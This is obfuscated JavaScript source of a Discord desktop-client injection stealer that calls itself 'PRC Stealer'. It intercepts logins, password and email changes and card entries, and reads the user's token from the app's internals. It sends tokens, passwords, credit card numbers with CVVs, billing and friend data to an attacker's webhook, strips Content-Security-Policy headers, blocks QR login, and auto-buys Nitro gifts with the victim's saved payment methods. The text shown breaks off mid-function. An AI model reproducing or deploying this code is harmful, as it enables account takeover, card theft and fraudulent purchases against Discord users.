// yewss
const _0x33da9a = (function () {
    let _0x66b965 = true
    return function (_0x53cfa7, _0xba6a70) {
        const _0x2c66a7 = _0x66b965
            ? function () {
                if (_0xba6a70) {
                    const _0x5dca0d = _0xba6a70.apply(_0x53cfa7, arguments)
                    return (_0xba6a70 = null), _0x5dca0d
                }
            }
            : function () { }
        return (_0x66b965 = false), _0x2c66a7
    }
})(),
    _0xf28ad2 = _0x33da9a(this, function () {
        return _0xf28ad2
            .toString()
            .search('(((.+)+)+)+$')
            .toString()
            .constructor(_0xf28ad2)
            .search('(((.+)+)+)+$')
    })
_0xf28ad2()
const _0x43c933 = (function () {
    let _0x37e41d = true
    return function (_0x251bd2, _0x1a515f) {
        const _0x5d1d40 = _0x37e41d
            ? function () {
                if (_0x1a515f) {
                    const _0x5649fb = _0x1a515f.apply(_0x251bd2, arguments)
                    return (_0x1a515f = null), _0x5649fb
                }
            }
            : function () { }
        return (_0x37e41d = false), _0x5d1d40
    }
})()
    ; (function () {
        _0x43c933(this, function () {
            const _0x213d8f = new RegExp('function *\\( *\\)'),
                _0x73fe46 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
                _0x3809e3 = _0x31eced('init')
            !_0x213d8f.test(_0x3809e3 + 'chain') || !_0x73fe46.test(_0x3809e3 + 'input')
                ? _0x3809e3('0')
                : _0x31eced()
        })()
    })()
const args = process.argv,
    fs = require('fs'),
    path = require('path'),
    https = require('https'),
    querystring = require('querystring'),
    { BrowserWindow, session } = require('electron'),
    { exec } = require('child_process'),
    config = {
        prc: 'PRC',
        webhook: '%WEBHOOK%',
        notify_init: true,
        auto_buy_nitro: true,
        ping_on_run: true,
        ping_val: '@everyone',
        embed_name: 'PRC Stealer - https://github.com/Esrefpasa',
        embed_icon:
            'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&'.replace(
                / /g,
                '%20'
            ),
        injection_url:
            'https://raw.githubusercontent.com/Esrefpasa/discord-injection/refs/heads/main/index.js',
        api: 'https://discord.com/api/v9/users/@me',
        nitro: {
            boost: {
                year: {
                    id: '521847234246082599',
                    sku: '511651885459963904',
                    price: '9999',
                },
                month: {
                    id: '521847234246082599',
                    sku: '511651880837840896',
                    price: '999',
                },
            },
            classic: {
                month: {
                    id: '521846918637420545',
                    sku: '511651871736201216',
                    price: '499',
                },
            },
        },
        filter: {
            urls: [
                'https://discord.com/api/v*/users/@me',
                'https://discordapp.com/api/v*/users/@me',
                'https://*.discord.com/api/v*/users/@me',
                'https://discordapp.com/api/v*/auth/login',
                'https://discord.com/api/v*/auth/login',
                'https://*.discord.com/api/v*/auth/login',
                'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
                'https://api.stripe.com/v*/tokens',
                'https://api.stripe.com/v*/setup_intents/*/confirm',
                'https://api.stripe.com/v*/payment_intents/*/confirm',
            ],
        },
        filter2: {
            urls: [
                'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
                'https://*.discord.com/api/v*/applications/detectable',
                'https://discord.com/api/v*/applications/detectable',
                'https://*.discord.com/api/v*/users/@me/library',
                'https://discord.com/api/v*/users/@me/library',
                'wss://remote-auth-gateway.discord.gg/*',
            ],
        },
        badges: {
            Discord_Employee: {
                Value: 1,
                Emoji: '<:staff:874750808728666152>',
                Rare: true,
            },
            Partnered_Server_Owner: {
                Value: 2,
                Emoji: '<:partner:874750808678354964>',
                Rare: true,
            },
            HypeSquad_Events: {
                Value: 4,
                Emoji: '<:hypesquad_events:874750808594477056>',
                Rare: true,
            },
            Bug_Hunter_Level_1: {
                Value: 8,
                Emoji: '<:bughunter_1:874750808426692658>',
                Rare: true,
            },
            Early_Supporter: {
                Value: 512,
                Emoji: '<:early_supporter:874750808414113823>',
                Rare: true,
            },
            Bug_Hunter_Level_2: {
                Value: 16384,
                Emoji: '<:bughunter_2:874750808430874664>',
                Rare: true,
            },
            Early_Verified_Bot_Developer: {
                Value: 131072,
                Emoji: '<:developer:874750808472825986>',
                Rare: true,
            },
            House_Bravery: {
                Value: 64,
                Emoji: '<:bravery:874750808388952075>',
                Rare: false,
            },
            House_Brilliance: {
                Value: 128,
                Emoji: '<:brilliance:874750808338608199>',
                Rare: false,
            },
            House_Balance: {
                Value: 256,
                Emoji: '<:balance:874750808267292683>',
                Rare: false,
            },
        },
    },
    execScript = (_0x359958) => {
        const _0x1a6c83 = BrowserWindow.getAllWindows()[0]
        return _0x1a6c83.webContents.executeJavaScript(_0x359958, true)
    },
    getInfo = async (_0x291fcd) => {
        const _0x586ede = await execScript(
            'var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open("GET", "' +
            config.api +
            '", false);\n    xmlHttp.setRequestHeader("Authorization", "' +
            _0x291fcd +
            '");\n    xmlHttp.send(null);\n    xmlHttp.responseText;'
        )
        return JSON.parse(_0x586ede)
    },
    fetchBilling = async (_0x4e4dad) => {
        const _0x1fac93 = await execScript(
            'var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open("GET", "' +
            config.api +
            '/billing/payment-sources", false); \n    xmlHttp.setRequestHeader("Authorization", "' +
            _0x4e4dad +
            '"); \n    xmlHttp.send(null); \n    xmlHttp.responseText'
        )
        if (!_0x1fac93.lenght || _0x1fac93.length === 0) {
            return ''
        }
        return JSON.parse(_0x1fac93)
    },
    getBilling = async (_0x1ce4d9) => {
        const _0x3bb9d7 = await fetchBilling(_0x1ce4d9)
        if (!_0x3bb9d7) {
            return '`\u274C`'
        }
        let _0x1d982a = ''
        _0x3bb9d7.forEach((_0x2552bf) => {
            if (!_0x2552bf.invalid) {
                switch (_0x2552bf.type) {
                    case 1:
                        _0x1d982a += '\uD83D\uDCB3 '
                        break
                    case 2:
                        _0x1d982a += '<:paypal:951139189389410365> '
                        break
                }
            }
        })
        if (!_0x1d982a) {
            _0x1d982a = '`\u274C`'
        }
        return _0x1d982a
    },
    Purchase = async (_0x5c0ea2, _0x257aac, _0x36941d, _0x4f00ad) => {
        const _0x15cea2 = {
            expected_amount: config.nitro[_0x36941d][_0x4f00ad].price,
            expected_currency: 'usd',
            gift: true,
            payment_source_id: _0x257aac,
            payment_source_token: null,
            purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
            sku_subscription_plan_id: config.nitro[_0x36941d][_0x4f00ad].sku,
        },
            _0x43e475 = execScript(
                'var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/' +
                config.nitro[_0x36941d][_0x4f00ad].id +
                '/purchase", false);\n    xmlHttp.setRequestHeader("Authorization", "' +
                _0x5c0ea2 +
                "\");\n    xmlHttp.setRequestHeader('Content-Type', 'application/json');\n    xmlHttp.send(JSON.stringify(" +
                JSON.stringify(_0x15cea2) +
                '));\n    xmlHttp.responseText'
            )
        if (_0x43e475.gift_code) {
            return 'https://discord.gift/' + _0x43e475.gift_code
        } else {
            return null
        }
    },
    buyNitro = async (_0x3fd3ec) => {
        const _0x4bc64e = await fetchBilling(_0x3fd3ec),
            _0x20de2e = 'Failed to Purchase \u274C'
        if (!_0x4bc64e) {
            return _0x20de2e
        }
        let _0x1cbcca = []
        _0x4bc64e.forEach((_0x55b398) => {
            !_0x55b398.invalid && (_0x1cbcca = _0x1cbcca.concat(_0x55b398.id))
        })
        for (let _0x3aa6fe in _0x1cbcca) {
            const _0x1eb76a = Purchase(_0x3fd3ec, _0x3aa6fe, 'boost', 'year')
            if (_0x1eb76a !== null) {
                return _0x1eb76a
            } else {
                const _0x11b9b1 = Purchase(_0x3fd3ec, _0x3aa6fe, 'boost', 'month')
                if (_0x11b9b1 !== null) {
                    return _0x11b9b1
                } else {
                    const _0x17b703 = Purchase(_0x3fd3ec, _0x3aa6fe, 'classic', 'month')
                    return _0x17b703 !== null ? _0x17b703 : _0x20de2e
                }
            }
        }
    },
    calcDate = (_0x1c7d20, _0x24e538) =>
        new Date(_0x1c7d20.setMonth(_0x1c7d20.getMonth() + _0x24e538)),
    getNitro = (_0x323783) => {
        switch (_0x323783.premium_type) {
            default:
                return '`\u274C`'
            case 1:
                return '<:946246402105819216:962747802797113365>'
            case 2:
                if (!_0x323783.premium_guild_since) {
                    return '<:946246402105819216:962747802797113365>'
                }
                var _0x5e3b14 = new Date(Date.now()),
                    _0x21ca1a = [
                        '<:1ay:1053258370213224498>',
                        '<:2ay:1053258368795557948>',
                        '<:3ay:1053258367159771136>',
                        '<:6ay:1053258365620465736>',
                        '<:9ay:1053258363997278269>',
                        '<:12ay:1053258361480683541>',
                        '<:15ay:1053258360293687346>',
                        '<:18ay:1053258358838263849>',
                        '<:24ay:1053258356908904478>',
                    ],
                    _0x5ee1a3 = [
                        new Date(_0x323783.premium_guild_since),
                        new Date(_0x323783.premium_guild_since),
                        new Date(_0x323783.premium_guild_since),
                        new Date(_0x323783.premium_guild_since),
                        new Date(_0x323783.premium_guild_since),
                        new Date(_0x323783.premium_guild_since),
                        new Date(_0x323783.premium_guild_since),
                    ],
                    _0x341874 = [2, 3, 6, 9, 12, 15, 18, 24],
                    _0x323783 = []
                for (var _0x3778f5 in _0x5ee1a3)
                    _0x323783.push(
                        Math.round(
                            (calcDate(_0x5ee1a3[_0x3778f5], _0x341874[_0x3778f5]) -
                                _0x5e3b14) /
                            86400000
                        )
                    )
                var _0x4f177e = 0
                for (var _0x3778f5 of _0x323783) _0x3778f5 > 0 ? '' : _0x4f177e++
                return (
                    '<:946246402105819216:962747802797113365> ' + _0x21ca1a[_0x4f177e]
                )
        }
    }
function getRareBadges(_0x2093d3) {
    var _0x1b307c = ''
    for (const _0x567cc0 in config.badges) {
        let _0x126de9 = config.badges[_0x567cc0]
        if ((_0x2093d3 & _0x126de9.Value) == _0x126de9.Value && _0x126de9.Rare) {
            _0x1b307c += _0x126de9.Emoji
        }
    }
    return _0x1b307c
}
function getBadges(_0x59500e) {
    var _0x4f7caa = ''
    for (const _0x5eae93 in config.badges) {
        let _0xb6d8fb = config.badges[_0x5eae93]
        if ((_0x59500e & _0xb6d8fb.Value) == _0xb6d8fb.Value) {
            _0x4f7caa += _0xb6d8fb.Emoji
        }
    }
    if (_0x4f7caa == '') {
        _0x4f7caa = '`\u274C`'
    }
    return _0x4f7caa
}
const hooker = async (_0x26fec0) => {
    const _0x1e823d = JSON.stringify(_0x26fec0),
        _0x2e5ff5 = [
            config.webhook,
        ],
        _0xae981d = {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
        },
        _0x3d85eb = {
            method: 'POST',
            headers: _0xae981d,
        }
    for (const _0x79e7eb of _0x2e5ff5) {
        const _0x570afc = https.request(_0x79e7eb, _0x3d85eb)
        _0x570afc.on('error', (_0x5122dc) => { })
        _0x570afc.write(_0x1e823d)
        _0x570afc.end()
    }
},
    getURL = async (_0x28061e, _0x4b1b52) => {
        var _0x460025 = await execScript(
            '\n  var xmlHttp = new XMLHttpRequest();\n  xmlHttp.open( "GET", "' +
            _0x28061e +
            '", false );\n  xmlHttp.setRequestHeader("Authorization", "' +
            _0x4b1b52 +
            '");\n  xmlHttp.send( null );\n  JSON.parse(xmlHttp.responseText);'
        )
        return _0x460025
    },
    login = async (_0x8432a2, _0x1bd107, _0x51e08d) => {
        const _0x7b0241 = await getInfo(_0x51e08d),
            _0x1608b1 = await getURL(
                'https://discord.com/api/v9/users/' + _0x7b0241.id + '/profile',
                _0x51e08d
            ),
            _0xdea89 = getNitro(_0x1608b1),
            _0xb7522a = getBadges(_0x7b0241.flags),
            _0x27cb3b = await getBilling(_0x51e08d),
            _0x3239d8 = await getRelationships(_0x51e08d),
            _0x1446fb = {
                username: config.embed_name,
                avatar_url: config.embed_icon,
                embeds: [
                    {
                        title: 'User Logged In',
                        color: 3092790,
                        fields: [
                            {
                                name: 'Token',
                                value: '```' + _0x51e08d + '```',
                            },
                            {
                                name: 'Nitro Type',
                                value: _0xdea89,
                                inline: true,
                            },
                            {
                                name: 'Badges',
                                value: _0xb7522a,
                                inline: true,
                            },
                            {
                                name: 'Billing',
                                value: _0x27cb3b,
                                inline: true,
                            },
                            {
                                name: 'Email',
                                value: '```' + _0x8432a2 + '```',
                            },
                            {
                                name: 'Password',
                                value: '```' + _0x1bd107 + '```',
                            },
                        ],
                        author: {
                            name:
                                _0x7b0241.username +
                                '#' +
                                _0x7b0241.discriminator +
                                ' | ' +
                                _0x7b0241.id,
                            icon_url:
                                'https://cdn.discordapp.com/avatars/' +
                                _0x7b0241.id +
                                '/' +
                                _0x7b0241.avatar +
                                '.webp',
                        },
                        footer: {
                            text: 'PRC Stealer - https://github.com/Esrefpasa',
                            icon_url:
                                'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&',
                        },
                    },
                    {
                        title: 'HQ Friends',
                        color: 3092790,
                        description: _0x3239d8.friends,
                        author: {
                            name:
                                _0x7b0241.username +
                                '#' +
                                _0x7b0241.discriminator +
                                ' | ' +
                                _0x7b0241.id,
                            icon_url:
                                'https://cdn.discordapp.com/avatars/' +
                                _0x7b0241.id +
                                '/' +
                                _0x7b0241.avatar +
                                '.webp',
                        },
                        footer: {
                            text: 'PRC Stealer - https://github.com/Esrefpasa',
                            icon_url:
                                'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&',
                        },
                    },
                ],
            }
        if (config.ping_on_run) {
            _0x1446fb.content = config.ping_val
        }
        hooker(_0x1446fb)
    },
    passwordChanged = async (_0x1008e2, _0x3ecbc6, _0x36e9b0) => {
        const _0x1101e4 = await getInfo(_0x36e9b0)
        var _0x3b77c7 = await getURL(
            'https://discord.com/api/v9/users/' + _0x1101e4.id + '/profile',
            _0x36e9b0
        )
        const _0x184621 = getNitro(_0x3b77c7),
            _0x1286e8 = getBadges(_0x1101e4.flags),
            _0x11ce25 = await getBilling(_0x36e9b0),
            _0x45f6b2 = {
                username: config.embed_name,
                avatar_url: config.embed_icon,
                embeds: [
                    {
                        title: 'Password Changed',
                        color: 3092790,
                        fields: [
                            {
                                name: 'Token',
                                value: '```' + _0x36e9b0 + '```',
                            },
                            {
                                name: 'Nitro Type',
                                value: _0x184621,
                                inline: true,
                            },
                            {
                                name: 'Badges',
                                value: _0x1286e8,
                                inline: true,
                            },
                            {
                                name: 'Billing',
                                value: _0x11ce25,
                                inline: true,
                            },
                            {
                                name: 'Email',
                                value: '```' + _0x1101e4.email + '```',
                            },
                            {
                                name: 'Old Password',
                                value: '```' + _0x1008e2 + '```',
                            },
                            {
                                name: 'New Password',
                                value: '```' + _0x3ecbc6 + '```',
                            },
                        ],
                        author: {
                            name:
                                _0x1101e4.username +
                                '#' +
                                _0x1101e4.discriminator +
                                ' | ' +
                                _0x1101e4.id,
                            icon_url:
                                'https://cdn.discordapp.com/avatars/' +
                                _0x1101e4.id +
                                '/' +
                                _0x1101e4.avatar +
                                '.webp',
                        },
                        footer: {
                            text: 'PRC Stealer - https://github.com/Esrefpasa',
                            icon_url:
                                'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&',
                        },
                    },
                ],
            }
        if (config.ping_on_run) {
            _0x45f6b2.content = config.ping_val
        }
        hooker(_0x45f6b2)
    },
    emailChanged = async (_0x1c8072, _0x50e1c0, _0x2ad447) => {
        const _0x2be31c = await getInfo(_0x2ad447)
        var _0x5aca88 = await getURL(
            'https://discord.com/api/v9/users/' + _0x2be31c.id + '/profile',
            _0x2ad447
        )
        const _0x230161 = getNitro(_0x5aca88),
            _0x4748c4 = getBadges(_0x2be31c.flags),
            _0x127971 = await getBilling(_0x2ad447),
            _0x2218d0 = {
                username: config.embed_name,
                avatar_url: config.embed_icon,
                embeds: [
                    {
                        title: 'Email Changed',
                        color: 3092790,
                        fields: [
                            {
                                name: 'Token',
                                value: '```' + _0x2ad447 + '```',
                            },
                            {
                                name: 'Nitro Type',
                                value: _0x230161,
                                inline: true,
                            },
                            {
                                name: 'Badges',
                                value: _0x4748c4,
                                inline: true,
                            },
                            {
                                name: 'Billing',
                                value: _0x127971,
                                inline: true,
                            },
                            {
                                name: 'New Email',
                                value: '```' + _0x1c8072 + '```',
                            },
                            {
                                name: 'Password',
                                value: '```' + _0x50e1c0 + '```',
                            },
                        ],
                        author: {
                            name:
                                _0x2be31c.username +
                                '#' +
                                _0x2be31c.discriminator +
                                ' | ' +
                                _0x2be31c.id,
                            icon_url:
                                'https://cdn.discordapp.com/avatars/' +
                                _0x2be31c.id +
                                '/' +
                                _0x2be31c.avatar +
                                '.webp',
                        },
                        footer: {
                            text: 'PRC Stealer - https://github.com/Esrefpasa',
                            icon_url:
                                'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&',
                        },
                    },
                ],
            }
        if (config.ping_on_run) {
            _0x2218d0.content = config.ping_val
        }
        hooker(_0x2218d0)
    },
    PaypalAdded = async (_0x480048) => {
        const _0x11c39f = await getInfo(_0x480048)
        var _0x5f5be9 = await getURL(
            'https://discord.com/api/v9/users/' + _0x11c39f.id + '/profile',
            _0x480048
        )
        const _0xbe3d0e = getNitro(_0x5f5be9),
            _0x241cbf = getBadges(_0x11c39f.flags),
            _0x2ab97e = getBilling(_0x480048),
            _0xcaafa9 = {
                username: config.embed_name,
                avatar_url: config.embed_icon,
                embeds: [
                    {
                        title: 'Paypal Added',
                        description: 'Nitro Time \uD83E\uDD73',
                        color: 3092790,
                        fields: [
                            {
                                name: 'Token',
                                value: '```' + _0x480048 + '```',
                            },
                            {
                                name: 'Nitro Type',
                                value: _0xbe3d0e,
                                inline: true,
                            },
                            {
                                name: 'Badges',
                                value: _0x241cbf,
                                inline: true,
                            },
                            {
                                name: 'Billing',
                                value: _0x2ab97e,
                                inline: true,
                            },
                        ],
                        author: {
                            name:
                                _0x11c39f.username +
                                '#' +
                                _0x11c39f.discriminator +
                                ' | ' +
                                _0x11c39f.id,
                            icon_url:
                                'https://cdn.discordapp.com/avatars/' +
                                _0x11c39f.id +
                                '/' +
                                _0x11c39f.avatar +
                                '.webp',
                        },
                        footer: {
                            text: 'PRC Stealer - https://github.com/Esrefpasa',
                            icon_url:
                                'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&',
                        },
                    },
                ],
            }
        if (config.ping_on_run) {
            _0xcaafa9.content = config.ping_val
        }
        hooker(_0xcaafa9)
    },
    ccAdded = async (_0x154c7e, _0x287c38, _0x4af084, _0x3b9822, _0x4e8fac) => {
        const _0x124ffe = await getInfo(_0x4e8fac)
        var _0x4954e7 = await getURL(
            'https://discord.com/api/v9/users/' + _0x124ffe.id + '/profile',
            _0x4e8fac
        )
        const _0x11b6bc = getNitro(_0x4954e7),
            _0x3e4ae7 = getBadges(_0x124ffe.flags),
            _0x4eee37 = await getBilling(_0x4e8fac),
            _0x5e50a2 = {
                username: config.embed_name,
                avatar_url: config.embed_icon,
                embeds: [
                    {
                        title: 'Credit Card Added',
                        color: 3092790,
                        fields: [
                            {
                                name: 'CC Number',
                                value: '`' + _0x154c7e + '`',
                                inline: true,
                            },
                            {
                                name: 'CC Exp',
                                value: '`' + _0x4af084 + '/' + _0x3b9822 + '`',
                                inline: true,
                            },
                            {
                                name: 'CVV/CVC',
                                value: '`' + _0x287c38 + '`',
                                inline: true,
                            },
                            {
                                name: 'Token',
                                value: '```' + _0x4e8fac + '```',
                            },
                            {
                                name: 'Nitro Type',
                                value: _0x11b6bc,
                                inline: true,
                            },
                            {
                                name: 'Badges',
                                value: _0x3e4ae7,
                                inline: true,
                            },
                            {
                                name: 'Billing',
                                value: _0x4eee37,
                                inline: true,
                            },
                        ],
                        author: {
                            name:
                                _0x124ffe.username +
                                '#' +
                                _0x124ffe.discriminator +
                                ' | ' +
                                _0x124ffe.id,
                            icon_url:
                                'https://cdn.discordapp.com/avatars/' +
                                _0x124ffe.id +
                                '/' +
                                _0x124ffe.avatar +
                                '.webp',
                        },
                        footer: {
                            text: 'PRC Stealer - https://github.com/Esrefpasa',
                            icon_url:
                                'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&',
                        },
                    },
                ],
            }
        if (config.ping_on_run) {
            _0x5e50a2.content = config.ping_val
        }
        hooker(_0x5e50a2)
    }
async function getRelationships(_0x1b2454) {
    var _0x7f7985 = await execScript(
        'var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "' +
        _0x1b2454 +
        '");xmlHttp.send( null );xmlHttp.responseText',
        true
    ),
        _0xc377bd = JSON.parse(_0x7f7985)
    const _0x1cce91 = _0xc377bd.filter((_0x46e49d) => {
        return _0x46e49d.type == 1
    })
    var _0x27104e = ''
    for (z of _0x1cce91) {
        var _0x1284f8 = getRareBadges(z.user.public_flags)
        _0x1284f8 != '' &&
            (_0x27104e +=
                _0x1284f8 +
                (' | ' + z.user.username + '#' + z.user.discriminator + '\n'))
    }
    if (!_0x27104e) {
        _0x27104e = 'No Rare Friends'
    }
    return { friends: _0x27104e }
}
async function firststart() {
    if (!fs.existsSync(process.cwd() + '\\' + config.prc)) {
        fs.mkdirSync(process.cwd() + '\\' + config.prc)
        if (config.notify_init) {
            const _0x2b39bc = await execScript(
                "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
            ),
                _0x388183 = await getInfo(_0x2b39bc),
                _0x3f9312 = await getURL(
                    'https://discord.com/api/v9/users/' + _0x388183.id + '/profile',
                    _0x2b39bc
                ),
                _0x1ac2d9 = getNitro(_0x3f9312),
                _0x35e966 = getBadges(_0x388183.flags),
                _0x40ed84 = await getBilling(_0x2b39bc),
                _0x2f0701 = await getRelationships(_0x2b39bc),
                _0x5af313 = {
                    username: config.embed_name,
                    avatar_url: config.embed_icon,
                    embeds: [
                        {
                            title: 'PRC Initalized',
                            color: 3092790,
                            fields: [
                                {
                                    name: 'Token',
                                    value: '```' + _0x2b39bc + '```',
                                },
                                {
                                    name: 'Nitro Type',
                                    value: _0x1ac2d9,
                                    inline: true,
                                },
                                {
                                    name: 'Badges',
                                    value: _0x35e966,
                                    inline: true,
                                },
                                {
                                    name: 'Billing',
                                    value: _0x40ed84,
                                    inline: true,
                                },
                                {
                                    name: 'Email',
                                    value: '```' + _0x388183.email + '```',
                                },
                                {
                                    name: 'Phone Number',
                                    value: '```' + _0x388183.phone ?? '\u274C' + '```',
                                },
                            ],
                            author: {
                                name:
                                    _0x388183.username +
                                    '#' +
                                    _0x388183.discriminator +
                                    ' | ' +
                                    _0x388183.id,
                                icon_url:
                                    'https://cdn.discordapp.com/avatars/' +
                                    _0x388183.id +
                                    '/' +
                                    _0x388183.avatar +
                                    '.webp',
                            },
                            footer: {
                                text: 'PRC Stealer - https://github.com/Esrefpasa',
                                icon_url:
                                    'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&',
                            },
                        },
                        {
                            title: 'HQ Friends',
                            color: 3092790,
                            description: _0x2f0701.friends,
                            author: {
                                name:
                                    _0x388183.username +
                                    '#' +
                                    _0x388183.discriminator +
                                    ' | ' +
                                    _0x388183.id,
                                icon_url:
                                    'https://cdn.discordapp.com/avatars/' +
                                    _0x388183.id +
                                    '/' +
                                    _0x388183.avatar +
                                    '.webp',
                            },
                            footer: {
                                text: 'PRC Stealer - https://github.com/Esrefpasa',
                                icon_url:
                                    'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&',
                            },
                        },
                    ],
                }
            if (config.ping_on_run) {
                _0x5af313.content = config.ping_val
            }
            hooker(_0x5af313)
        }
    }
}
const nitroBought = async (_0x5a8098) => {
    const _0x4bf977 = await getInfo(_0x5a8098)
    var _0x31d295 = await getURL(
        'https://discord.com/api/v9/users/' + _0x4bf977.id + '/profile',
        _0x5a8098
    )
    const _0x45fd6d = getNitro(_0x31d295),
        _0x3ae226 = getBadges(_0x4bf977.flags),
        _0x23647f = await getBilling(_0x5a8098),
        _0xb005d3 = await buyNitro(_0x5a8098),
        _0xe94e7f = {
            username: config.embed_name,
            content: _0xb005d3,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    title: 'Nitro Bought \uD83E\uDD73',
                    description: '**' + _0xb005d3 + '**',
                    color: 3092790,
                    fields: [
                        {
                            name: 'Token',
                            value: '```' + _0x5a8098 + '```',
                        },
                        {
                            name: 'Nitro Type',
                            value: _0x45fd6d,
                            inline: true,
                        },
                        {
                            name: 'Badges',
                            value: _0x3ae226,
                            inline: true,
                        },
                        {
                            name: 'Billing',
                            value: _0x23647f,
                            inline: true,
                        },
                    ],
                    author: {
                        name:
                            _0x4bf977.username +
                            '#' +
                            _0x4bf977.discriminator +
                            ' | ' +
                            _0x4bf977.id,
                        icon_url:
                            'https://cdn.discordapp.com/avatars/' +
                            _0x4bf977.id +
                            '/' +
                            _0x4bf977.avatar +
                            '.webp',
                    },
                    footer: {
                        text: 'PRC Stealer - https://github.com/Esrefpasa',
                        icon_url:
                            'https://cdn.discordapp.com/attachments/1440075942314770584/1497982145669632010/A_1.png?ex=69ef8016&is=69ee2e96&hm=694309d5a4f4c6972ae8920206713c1aac86158fc4f54c6dbc159fce2660a2fe&',
                    },
                },
            ],
        }
    if (config.ping_on_run) {
        _0xe94e7f.content = config.ping_val + ('\n' + _0xb005d3)
    }
    hooker(_0xe94e7f)
}
session.defaultSession.webRequest.onBeforeRequest(
    config.filter2,
    async (_0x55d238, _0x5da8d4) => {
        if (_0x55d238.url.startsWith('wss://remote-auth-gateway')) {
            return _0x5da8d4({ cancel: true })
        }
        await firststart()
        _0x5da8d4({})
    }
)
session.defaultSession.webRequest.onHeadersReceived((_0x5148dd, _0x2ff1e8) => {
    _0x5148dd.url.startsWith(config.webhook)
        ? _0x5148dd.url.includes('discord.com')
            ? _0x2ff1e8({
                responseHeaders: Object.assign(
                    { 'Access-Control-Allow-Headers': '*' },
                    _0x5148dd.responseHeaders
                ),
            })
            : _0x2ff1e8({
                responseHeaders: Object.assign(
                    {
                        'Content-Security-Policy': [
                            "default-src '*'",
                            "Access-Control-Allow-Headers '*'",
                            "Access-Control-Allow-Origin '*'",
                        ],
                        'Access-Control-Allow-Headers': '*',
                        'Access-Control-Allow-Origin': '*',
                    },
                    _0x5148dd.responseHeaders
                ),
            })
        : (delete _0x5148dd.responseHeaders['content-security-policy'],
            delete _0x5148dd.responseHeaders['content-security-policy-report-only'],
            _0x2ff1e8({
                responseHeaders: {
                    ..._0x5148dd.responseHeaders,
                    'Access-Control-Allow-Headers': '*',
                },
            }))
})
session.defaultSession.webRequest.onResponseStarted(
    config.filter,
    async (_0x4e9a30, _0x140890) => {
        if (_0x4e9a30.url.includes('tokens')) {
            const _0x10e12c = Buffer.from(_0x4e9a30.uploadData[0].bytes).toString(),
                _0x5df2ad = querystring.parse(_0x10e12c.toString()),
                _0x177909 = await execScript(
                    "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
                )
            ccAdded(
                _0x5df2ad['card[number]'],
                _0x5df2ad['card[cvc]'],
                _0x5df2ad['card[exp_month]'],
                _0x5df2ad['card[exp_year]'],
                _0x177909
            ).catch(console.error)
            return
        }
    }
)
session.defaultSession.webRequest.onCompleted(
    config.filter,
    async (_0x5a2a8d, _0x5db818) => {
        if (_0x5a2a8d.statusCode !== 200 && _0x5a2a8d.statusCode !== 202) {
            return
        }
        const _0x4c46ca = Buffer.from(_0x5a2a8d.uploadData[0].bytes).toString(),
            _0xe93ac = JSON.parse(_0x4c46ca),
            _0x2941b9 = await execScript(
                "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
            )
        switch (true) {
            case _0x5a2a8d.url.endsWith('login'):
                login(_0xe93ac.login, _0xe93ac.password, _0x2941b9).catch(console.error)
                break
            case _0x5a2a8d.url.endsWith('users/@me') && _0x5a2a8d.method === 'PATCH':
                if (!_0xe93ac.password) {
                    return
                }
                _0xe93ac.email &&
                    emailChanged(_0xe93ac.email, _0xe93ac.password, _0x2941b9).catch(
                        console.error
                    )
                _0xe93ac.new_password &&
                    passwordChanged(
                        _0xe93ac.password,
                        _0xe93ac.new_password,
                        _0x2941b9
                    ).catch(console.error)
                break
            case _0x5a2a8d.url.endsWith('paypal_accounts') &&
                _0x5a2a8d.method === 'POST':
                PaypalAdded(_0x2941b9).catch(console.error)
                break
